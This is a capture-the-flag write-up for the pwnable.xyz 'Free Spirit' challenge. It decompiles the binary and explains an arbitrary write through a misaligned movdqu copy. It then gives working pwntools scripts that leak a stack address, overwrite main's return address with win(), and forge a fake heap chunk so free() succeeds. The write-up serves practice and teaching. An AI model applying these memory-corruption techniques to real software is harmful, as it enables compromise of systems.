---
title: pwnable.xyz Free Spirit
date: 2025-2-26
categories: [pwnableXYZ, writeup]
---

# Problem

> Free is misbehaving.

- `challenge`: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f9c9a081578630d7b736a704a82a275c363b22d9, not stripped

# Recon

The `main()` function in pseudo c, `1` can read 32 bytes on to the heap buffer, `2` can leak stack address, and `3` can move the value in heap buffer to somewhere.

{% highlight c linenos %}
// main
void* chunk_addr = malloc(0x40);
while (true) {
    __printf_chk(1, "> ");
    char* buf;
    __builtin_memset(&buf, 0, 0x30);
    read(0, &buf, 0x30);
    int32_t input = atoi(&buf);
    if (input == 1)
        syscall(0, 0, chunk_addr, 0x20); // read(0, chunk_addr, 0x20);
    else {
        if (input == 2) {
            __printf_chk(1, "%p\n", &chunk_addr);
            continue;
        } else if (input == 3) {
            if (limit > 1) continue;
            else {
                int64_t var_60;
                var_60 = *(uint128_t*)chunk_addr;
                continue;
            }
        }
        if (!input) {
            // check stack 
            free(chunk_addr);
        }
        puts("Invalid");
    }
}
{% endhighlight%}

# Exploit

## Arbitrary Write

Take a closer look at line 19 in assembly, the instruction [`movdqu`](https://c9x.me/x86/html/file_module_x86_id_184.html) will move unaligned double quadword, which is 128 bits (16 bytes), from heap buffer to `rsp+0x8`. Notice that `chunk_addr` (`rsp+0x10`) will also be overwrite by 0x0040088d, since we control the heap buffer data through option `1`, this create a arbitrary write. The following payload is able to write to any address repeatedly.

```
00400884  488b442410         mov     rax, qword [rsp+0x10 {chunk_addr}]
00400889  f30f6f00           movdqu  xmm0, xmmword [rax]
0040088d  f30f7f442408       movdqu  xmmword [rsp+0x8 {var_60}], xmm0
```

```
1
<4 bytes to write to chunk_addr><next address to write>
3
```

## Ret2win

Since we can control any address, we can set the return address of `main()` to `win()` (0x400a3e) with the script

```python
# pwn template --host svc.pwnable.xyz --port 30005 ./challenge
io = start()

io.sendafter(b"> ", b"2")
chunk_addr = int(io.recvline().strip().decode(), 16)
log.info(f"{chunk_addr = :x}")
ret_addr = chunk_addr + 0x58

io.sendafter(b"> ", b"1")
io.send(b"a" * 8 + p64(ret_addr))
io.sendafter(b"> ", b"3")
io.sendafter(b"> ", b"1")
io.send(p64(0x400a3e))
```

## Free

However the `free()` on line 25 will cause error, hence won't return from `main()` and no flag for us. In order to `free()` successfully, we need to create a fake chunk, the address of the fake chunk doesn't necessary needs to be in the heap, as long as `address & 8 == 0` will be fine, I choose to use an empty memory `0x601100` to create the fake chunk with following structure

|          |  +0x0  |     +0x8    |
|:--------:|:------:|:-----------:|
| 0x6010f0 |  empty | size = 0x50 |
| 0x601100 |  empty |    empty    |

Combine with the previous scripts

```python
io = start()

io.sendafter(b"> ", b"2")
chunk_addr = int(io.recvline().strip().decode(), 16)
log.info(f"{chunk_addr = :x}")
ret_addr = chunk_addr + 0x58
log.info(f"{ret_addr = :x}")
fake_chunk_addr = 0x601100
log.info(f"{fake_chunk_addr = :x}")
fake_chunk_size = fake_chunk_addr - 0x8
log.info(f"{fake_chunk_size = :x}")

io.sendafter(b"> ", b"1")
io.send(b"a" * 8 + p64(ret_addr))
io.sendafter(b"> ", b"3")
io.sendafter(b"> ", b"1")
io.send(p64(0x400a3e) + p64(fake_chunk_size))
io.sendafter(b"> ", b"3")
io.sendafter(b"> ", b"1")
io.send(p64(0x50) + p64(fake_chunk_addr))
io.sendafter(b"> ", b"3")

io.sendafter(b"> ", b"0")

io.interactive()
```